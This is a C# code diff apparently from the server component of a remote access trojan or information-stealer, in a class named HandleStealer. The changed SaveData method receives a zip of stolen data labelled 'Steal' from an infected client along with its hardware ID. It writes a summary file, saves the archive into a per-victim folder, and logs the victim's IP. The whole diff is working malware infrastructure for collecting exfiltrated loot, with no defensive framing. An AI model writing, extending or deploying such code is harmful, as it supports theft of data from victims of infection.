@@ -18,22 +18,35 @@ namespace Server.Handle_Packet
 {
     public class HandleStealer
     {
+        public static void RecursiveDelete(string path)
+        {
+            if (!Directory.Exists(path)) return;
+            foreach(string subfile in Directory.GetFiles(path))
+            {
+                try { File.Delete(subfile); } catch { }
+            }
+            foreach (string subdir in Directory.GetDirectories(path))
+                RecursiveDelete(subdir);
+        }
         public void SaveData(Clients client, MsgPack unpack_msgpack)
         {
             try
             {
                 client.ID = unpack_msgpack.ForcePathObject("Hwid").AsString;
-                string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "Steal");
-                Methods.RecursiveDelete(fullPath);
-                if (!Directory.Exists(fullPath)) Directory.CreateDirectory(fullPath);
                 
+                string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "Steal");
+                if (!Directory.Exists(fullPath)) Directory.CreateDirectory(fullPath);
+
+                string filename = $"{fullPath}\\summary.txt";
+                string info = unpack_msgpack.ForcePathObject("info").AsString;
+                File.WriteAllText(filename, info);
+                Process.Start("notepad.exe", filename);
+
                 byte[] data = unpack_msgpack.ForcePathObject("zip").GetAsBytes();
-                string tempzip = $"{Path.GetTempPath()}\\steal.zip";
-                File.WriteAllBytes(tempzip, data);
-                ZipFile.ExtractToDirectory(tempzip, fullPath);
-                new HandleLogs().Addmsg($"Stealer Data From {client.Ip}:{client.ID} Saved to {fullPath}", Color.Blue);
-                Process.Start(fullPath);
-                //client?.Disconnected();
+                string zipfilename = $"{fullPath}\\steal.zip";
+                if (File.Exists(zipfilename)) File.Delete(zipfilename);
+                File.WriteAllBytes(zipfilename, data);
+                new HandleLogs().Addmsg($"{client.Ip} Data is Saved!", Color.Blue);
             }
             catch (Exception ex)
             {
